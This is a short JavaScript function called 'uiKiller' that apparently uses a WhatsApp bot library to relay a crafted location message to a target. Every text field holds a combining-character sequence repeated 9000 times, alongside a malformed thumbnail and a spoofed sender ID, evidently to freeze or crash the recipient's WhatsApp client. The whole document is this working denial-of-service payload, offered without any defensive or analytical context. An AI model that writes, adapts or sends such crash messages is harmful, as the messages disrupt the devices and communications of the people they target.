async function uiKiller(target) {
  await sock.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        url: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "Amelia-Hellboy Kill You", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( AMA )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}